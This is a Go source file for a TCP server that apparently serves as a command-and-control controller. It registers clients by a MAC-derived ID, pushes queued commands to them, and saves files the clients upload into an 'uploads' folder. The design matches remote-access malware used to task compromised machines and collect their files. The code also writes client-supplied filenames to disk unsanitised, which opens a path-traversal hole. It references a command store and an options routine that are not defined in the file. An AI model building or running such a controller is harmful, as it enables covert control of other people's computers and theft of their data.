package main

import (
	"fmt"
	"net"
	"log"
	"os"
	"bufio"
	"strings"
	"sync"
)

type Client struct {
	ID string
	Conn net.Conn
	Reachable bool
}


var(
	// Stored connections
	logInfo *log.Logger
	clients = make(map[string]*Client)
	clientsMu = sync.Mutex{}
)





func main() {

	// Handle log file
	logFile, err := os.OpenFile("logs.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	logInfo = log.New(logFile, "INFO : ", log.LstdFlags|log.Lmicroseconds|log.Lshortfile)

	log.SetOutput(logFile)


	// Initialize command store
	err = commandStore.Load()
	if err != nil {
		log.Fatalf("Failed to load command store: %v", err)
	}


	// Start server
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("Server started on port 8080")

	go showOptions()

	for {
		// Accept new connections
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			continue
		}

		go handleConnection(conn)
	}
}




func handleConnection(conn net.Conn) {

	// Create a unique ID for the client based on its MAC address
	reader := bufio.NewReader(conn)
	id, err := reader.ReadString('\n')
	if err != nil {
		logInfo.Printf("[!] Client : Failed to retrieve id (%s): %v\n", conn.RemoteAddr(), err)
		return
	}
	id = strings.TrimSpace(id)

	client := &Client{
		ID: id,
		Conn: conn,
		Reachable: true,
	}

	clientsMu.Lock()
	clients[id] = client
	clientsMu.Unlock()


	logInfo.Printf("[*] Client %s connected from %s", id, conn.RemoteAddr())


	// Send stored commands to client
	commands := commandStore.GetCommands(id)
	for _, cmd := range commands {
		_, err := conn.Write([]byte(cmd + "\n"))
		if err != nil {
			logInfo.Printf("[-] Failed to send queued command to %s: %v", id, err)
			return
		}
		logInfo.Printf("[+] Sent queued command \"%s\" to %s", cmd, id)
	}


	// Asynchrone reading from client
	go handleClient(client)
}


func handleClient(c *Client) {
	reader := bufio.NewReader(c.Conn)
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			logInfo.Printf("[!] Client %s disconnected (%s): %v\n", c.ID, c.Conn.RemoteAddr(), err)
			break
		}
		line = strings.TrimSpace(line)
		logInfo.Printf("Response [Client %s (%s)] %s", c.ID, c.Conn.RemoteAddr(), line)

		if strings.HasPrefix(line, "BEGIN_FILE:") {
			filename := strings.TrimPrefix(line, "BEGIN_FILE:")
			file, err := os.Create("uploads/" + filename)
			if err != nil {
				logInfo.Printf("[!] Could not create file %s: %v", filename, err)
				continue
			}
			for {
				dataLine, err := reader.ReadString('\n')
				if err != nil {
					logInfo.Printf("[!] Error while reading file: %v", err)
					break
				}
				if strings.TrimSpace(dataLine) == "END_FILE" {
					break
				}
				file.WriteString(dataLine)
			}
			file.Close()
			logInfo.Printf("[+] File %s received from %s", filename, c.Conn.RemoteAddr())
		}
	}

	// Fin de connexion
	c.Conn.Close()

	clientsMu.Lock()
	defer clientsMu.Unlock()

	// Confirme que le client existe dans la map
	if clientInMap, exists := clients[c.ID]; exists {
		clientInMap.Reachable = false
	}
}






